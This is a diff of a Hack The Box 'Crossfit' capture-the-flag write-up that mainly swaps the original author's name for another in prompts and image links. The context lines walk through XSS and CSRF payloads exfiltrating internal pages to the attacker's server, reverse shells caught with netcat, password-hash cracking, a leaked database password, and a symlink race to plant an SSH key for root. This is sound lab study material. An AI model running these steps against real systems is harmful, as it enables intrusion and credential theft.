@@ -9,6 +9,7 @@ avatar: assets/htb/crossfit.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Crossfit
 ---
+
 ## Overview
 
 This Insane-difficulty machine from Hack The Box took far longer to root than I would have liked, mostly due to getting hung up on the the final exploit. I took a break from it, after getting the user.txt, due to frustration and wanting to make progress elsewhere. This machine challenged me in a number of areas, from creative enumeration methods, to code and binary analysis, to "exploit" writing in a foreign language \(JavaScript and C!\). After taking a break for a few months, I came back with a fresh perspective and was able to quickly discover the errors I had been making. \(Along with fresh patience with the quick-clean script the authors used!\). A script to automate all of the moving pieces of the final exploit solved my issues and I was able to root the machine. 
@@ -49,7 +50,7 @@ All this time I did not know that there were more levels of verbosity, I had jus
 {% endhint %}
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ nmap -sCV -n -p- -Pn -vvv <YOUR_IP>                                                          1 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-28 12:30 EST
@@ -168,11 +169,11 @@ My first target was any potential low-hanging fruit that may have been accessed 
 In my nmap output for port 21 I found two hostnames, `crossfit.htb` and `gym-club.crossfit.htb`, which I added to my `/etc/hosts/` file.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ ftp crossfit.htb
 Connected to crossfit.htb.
 220 Cross Fit Ltd. FTP Server
-Name (crossfit.htb:zweilos): Anonymous
+Name (crossfit.htb:kac0): Anonymous
 331 Please specify the password.
 Password:
 530 Login incorrect.
@@ -185,30 +186,30 @@ Without credentials, the first thing I check is whether or not the server accept
 
 Next, I saw that there was an Apache web server being hosted on port 80.  I opened my web browser and navigated to `crossfit.htb` to see what I could find.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-default-apache.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-default-apache.png)
 
 `crossfit.htb` only led to the default apache page, meaning there was no default page configured at this address.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-gym-club.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-gym-club.png)
 
 However,  `gym-club.crossfit.htb` led to a CrossFit gym website.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-wappalyzer.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-wappalyzer.png)
 
 The Wappalyzer Firefox plugin showed me the technologies that were in use on this site.  I did a quick search for each of the ones that showed a version number but none led to any useable vulnerabilities.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-class-table.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-class-table.png)
 
 The site included a schedule of classes.  I took down the names Candy, Murph, Chelsea, and Annie as potential usernames.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-join-comingsoon.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-join-comingsoon.png)
 
 The link to "Join the club" led to a "coming soon" page, but there was nothing useful there.  
 
 Since I had already found one virtual host for this IP address, as in [HTB - Forwardslash](../hard/forwardslash-write-up.md) I tried to do vhost enumeration using gobuster.  I ran this in the background while enumerating the website.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ gobuster vhost -u http://crossfit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ===============================================================
 Gobuster v3.0.1
@@ -229,17 +230,17 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 This did not come up with anything, however.  I tried with `ffuf` as well, but did not find any more subdomains.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-employees.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-employees.png)
 
 On the "About-Us" page I found four more possible usernames: Becky Taylor, Noah Leonard, Evelyn Fields, and Leroy Guzman.  As the Manager, Leroy seemed like the most likely target.
 
 ### Cross-site Scripting \(XSS\)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-xss-test.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test.png)
 
 Since there wasn't anything obvious to go by, I started doing some basic vulnerability testing on the submission boxes. The first one at `/contact.php` did not seem to be vulnerable to either XSS or SQL injection.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-xss-test2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test2.png)
 
 However, the second one I found at `/blog-single.php` gave a warning about XSS.
 
@@ -253,16 +254,16 @@ A security report containing your IP address and browser information will be gen
 </div>
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-xss-test-caught.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test-caught.png)
 
 The warning claimed that browser information will be sent to the admin.  I thought maybe I could smuggle something that would be executed by the admin through the "browser information": AKA User-Agent.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-xss-test-caught-burp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-xss-test-caught-burp.png)
 
 Using Burp I sent a request with a link to my machine in the `User-Agent` field.  I made sure to send the same XSS attempt so this would be forwarded to the admin.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8090                       
 listening on [any] 8090 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 56252
@@ -278,12 +279,12 @@ Connection: keep-alive
 
 I received an HTTP GET request to my waiting netcat listener.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-security-report-denied.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-security-report-denied.png)
 
 In the `Referer` field I saw `/security_threat/report.php` in the response headers, but was not able to access it.  The code in this PHP file must have been what had checked the XSS request I had made, and somehow executed the `<script>` tags I had embedded, while creating the report for the admin.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8099
 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 <YOUR_IP> - - [28/Dec/2020 14:53:10] "GET /php-reverse-shell.php HTTP/1.1" 200 -
@@ -291,7 +292,7 @@ Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
 
 In the same spirit I tried to get the admin to download a PHP reverse shell from me, but I couldn't find where it had been uploaded nor figure out how to execute it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-origin.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-origin.png)
 
 `Origin` Header with `Access-Control-Allow-Origin` response header
 
@@ -303,7 +304,7 @@ I was familiar with fuzzing for vhosts as well as directories and files, but fuz
 * [https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html\#what-is-ffuf--and-what-is-it-used-for-](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#what-is-ffuf--and-what-is-it-used-for-)
 
 ```bash
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ ffuf -t 25 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<YOUR_IP> -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Allow-Origin'               
 
         /'___\  /'___\           /'___\       
@@ -339,7 +340,7 @@ ftp                     [Status: 200, Size: 10701, Words: 3427, Lines: 369]
 
  I knew if the response from the server included the words "Allow-Origin" that it was a valid request using the specified `Origin` header.  Using this information, I was able to find another virtual host: `ftp.crossfit.htb`.  
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-ftb-apache.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-ftb-apache.png)
 
 However, loading up this URL in my browser just led to another default Apache page.  Next, I decided to see if I could use the same Cross Origin Request Forgery to get the headers of the internal page to see if there was a different view from the proper origin.  
 
@@ -370,7 +371,7 @@ request2.send()
 I wrote a JavaScript payload to reach out to the `ftp.crossfit.htb` site then send the response back to my waiting Python HTTP server. I used this instead of netcat so the server would stay active and I wouldn't have to restart it each time the server closed the connection.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8090                                      
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 <YOUR_IP> - - [15/Jan/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
@@ -423,7 +424,7 @@ It took me a few tries, but I was able to get the server to download my script a
 
 After decoding the response I had the webpage at `http://ftp.crossfit.htb` as viewed internally.  I could tell right away that this was not the same default Apache server page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2.5-rescreate-response1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-rescreate-response1.png)
 
 I saved the HTML code to a file and opened it in my browser.  The page turned out to be an account management page for FTP.  The "Create Account" button was a link to a site that sounded interesting: `http://ftp.crossfit.htb/accounts/create`.  I modified my JavaScript payload to see what was at this page.
 
@@ -479,7 +480,7 @@ I got back a response with the encoded HTML code for the `/accounts/create` webs
 </html>
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2.5-recreate-adduser.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-recreate-adduser.png)
 
 With this page it looked as if I could create a new account.  I would need to send a POST request to `http://ftp.crossfit.htb/accounts` with a username, password, and the value from the hidden field `_token`. 
 
@@ -635,18 +636,18 @@ I went through a few iterations as you can see...at one point I thought that may
 
 I decoded the HTML response, then saved it to a file.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2.9-ftp-user-created.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.9-ftp-user-created.png)
 
 After recreating the webpage from the response, I could see that my account was created successfully!  Next I tried to log into the server using FTP.
 
 ### Port 21 - Revisited \(using LFTP\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ ftp crossfit.htb
 Connected to crossfit.htb.
 220 Cross Fit Ltd. FTP Server
-Name (crossfit.htb:zweilos): test3
+Name (crossfit.htb:kac0): test3
 530 Non-anonymous sessions must use encryption.
 Login failed.
 421 Service not available, remote server has closed connection
@@ -671,7 +672,7 @@ I tried logging in with FTP, but got an error `530 Non-anonymous sessions must u
 > ```
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ lftp                                                                                            1 ⨯
 lftp :~> set ftp:ssl-force true
 lftp :~> connect ftp.crossfit.htb
@@ -861,12 +862,12 @@ I received a connection request for my JavaScript code, and Burp, which I had us
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ script initial-foothold                                                                         1 ⨯
 Script started, output log file is 'initial-foothold'.
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ bash                                                             
-zweilos@kali:~/htb/crossfit$ nc -lvnp 8091
+kac0@kali:~/htb/crossfit$ nc -lvnp 8091
 listening on [any] 8091 ...
 connect to [10.10.14.161] from (UNKNOWN) [<YOUR_IP>] 60548
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
@@ -877,9 +878,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'   
 www-data@crossfit:/$ ^Z
 [1]+  Stopped                 nc -lvnp 8091
-zweilos@kali:~/htb/crossfit$ stty size
+kac0@kali:~/htb/crossfit$ stty size
 54 104
-zweilos@kali:~/htb/crossfit$ stty raw -echo
+kac0@kali:~/htb/crossfit$ stty raw -echo
 nc -lvnp 8091aa:~/htb/crossfit$ 
 
 www-data@crossfit:/$ stty rows 54 columns 104
@@ -1035,12 +1036,12 @@ www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml
 After searching for files that had mentioned the user `hank`, I found `adduser-hank.yml` in the`/etc/ansible/playbooks` directory.  This file had a password hash in it that I copied to my machine for cracking.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ hashcat --help | grep -i '$6'                                           
    1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System
                                                                                                         
                                                                                                    
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ hashcat -O -D1,2 -a0 -m1800 hash /usr/share/wordlists/rockyou.txt       
 hashcat (v6.1.1) starting...
 
@@ -1094,7 +1095,7 @@ Password hashes with `$6` at the beginning are most likely Unix sha512crypt encr
 ### User.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ ssh hank@<YOUR_IP>                                                                           1 ⨯
 The authenticity of host '<YOUR_IP> (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:tUOAuaaEof1kTFd4m9xiLiHk2k/pKSRnwhASRLb89Bo.
@@ -1127,7 +1128,7 @@ lrwxrwxrwx 1 root root    9 May 13  2020 .mysql_history -> /dev/null
 -rw-r--r-- 1 hank hank  807 Apr 18  2019 .profile
 -r--r----- 1 root hank   33 Jan 15 00:50 user.txt
 hank@crossfit:~$ cat user.txt 
-9e32****f446
+9e32************************f446
 ```
 
 After cracking the hash to get the password I fired up SSH and logged in as `hank`.  The first thing I did was collect my hard-earned proof.
@@ -1473,7 +1474,7 @@ DenyUsers ftpadm
 Unfortunately, the SSH configuration was set to explicitly deny `ftpadm` from logging in through SSH.  I could also see that it was configured to run the subsystem for SFTP.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ lftp -u ftpadm <YOUR_IP> -e "set ssl:verify-certificate no"                                  1 ⨯
 Password: 
 lftp ftpadm@<YOUR_IP>:~> ls                   
@@ -1675,7 +1676,7 @@ MariaDB [crossfit]> select * from users;
 I logged into MySQL using the same credentials as before, and checked for the field names in the `user` table so I knew how to frame my query to insert my reverse shell into the correct field.  I assumed that the `id` field was set to `AUTO_INCREMENT`, but just in case I set it to the value "1" to ensure my code would be the first entry.  The script from earlier said it pulled only the first entry.  
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.14.176] from (UNKNOWN) [<YOUR_IP>] 53362
@@ -1698,11 +1699,11 @@ $fs_iterator = new FilesystemIterator($msg_dir);
 I looked back through the code in `send_updates.php` looking for clues for how to proceed.  I noticed that these loops look through everything in `$msgdir` and check to see if there was a file, and if so, it would run the rest of the code.  
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ lftp -u ftpadm <YOUR_IP> -e "set ssl:verify-certificate no" 
 Password: 
 lftp ftpadm@<YOUR_IP>:~> put ~/rev-php.php    
-put: /home/zweilos/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
+put: /home/kac0/rev-php.php: Access failed: 553 Could not create file. (rev-php.php)
 lftp ftpadm@<YOUR_IP>:/> cd messages/
 lftp ftpadm@<YOUR_IP>:/messages> put ~/rev-php.php 
 73 bytes transferred
@@ -1735,7 +1736,7 @@ I lost my connection again due to an "unplanned network outage", so had to try a
 ### Enumeration as `isaac`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 10001                                                                                   1 ⨯
 listening on [any] 10001 ...
 connect to [10.10.14.176] from (UNKNOWN) [<YOUR_IP>] 54756
@@ -1759,9 +1760,9 @@ isaac@crossfit:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 isaac@crossfit:~$ ^Z  
 [1]+  Stopped                 nc -lvnp 9001
-zweilos@kali:~/htb/laboratory$ stty size
+kac0@kali:~/htb/laboratory$ stty size
 23 103
-zweilos@kali:~/htb/laboratory$ stty raw -echo
+kac0@kali:~/htb/laboratory$ stty raw -echo
 nc -lvnp 9001aa:~/htb/laboratory$ 
 
 isaac@crossfit:~$ stty rows 23 columns 103
@@ -2188,7 +2189,7 @@ MariaDB [crossfit]> DESCRIBE messages;
 After going back to my shell as `hank` and checking `mysql` I realized my problem.  I was getting an error while inserting my key into the database, but since there was a huge spam of output from my script I didn't see it. I used the `DESCRIBE` command to see the columns in the message table so I could tailor my input better.
 
 ```sql
-MariaDB [crossfit]> insert into messages (id, name, email, message) values (1, "ecdsa-sha2-nistp256", "zweilos", "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1");
+MariaDB [crossfit]> insert into messages (id, name, email, message) values (1, "ecdsa-sha2-nistp256", "kac0", "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1");
 Query OK, 1 row affected (0.001 sec)
 
 MariaDB [crossfit]> select * from messages
@@ -2196,7 +2197,7 @@ MariaDB [crossfit]> select * from messages
 +----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
 | id | name                | email   | message                                                                                                                                                                                                      |
 +----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
-|  1 | ecdsa-sha2-nistp256 | zweilos | AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1 |
+|  1 | ecdsa-sha2-nistp256 | kac0 | AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1 |
 +----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
 1 row in set (0.000 sec)
 ```
@@ -2236,7 +2237,7 @@ echo '    return 0;' >> rand.c
 echo '}' >> rand.c
 gcc rand.c -o rand
 chmod +x ./rand
-mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "zweilos@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIEJBS4TOdiQGcHfw8ifVbRk+tgzUlRPyEn9ogY0JogFO");'
+mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e'insert into messages (id, name, email, message) values (1, "ssh-ed25519", "kac0@kali", "AAAAC3NzaC1lZDI1NTE5AAAAIEJBS4TOdiQGcHfw8ifVbRk+tgzUlRPyEn9ogY0JogFO");'
 touch /var/local/testing
 while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
 ```
@@ -2260,7 +2261,7 @@ I verified that the randomly generated file was symlinked to `/root/.ssh/authori
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
+┌──(kac0㉿kali)-[~/htb/crossfit]
 └─$ ssh root@<YOUR_IP> -i root.key                                                            130 ⨯
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
 
@@ -2295,5 +2296,5 @@ lrwxrwxrwx  1 root root    9 May  4  2020 .mysql_history -> /dev/null
 -rw-r--r--  1 root root   74 May  5  2020 .selected_editor
 drwx------  2 root root 4096 Sep  2  2020 .ssh
 root@crossfit:~# cat root.txt 
-ee0a****8c80
+ee0a************************8c80
 ```
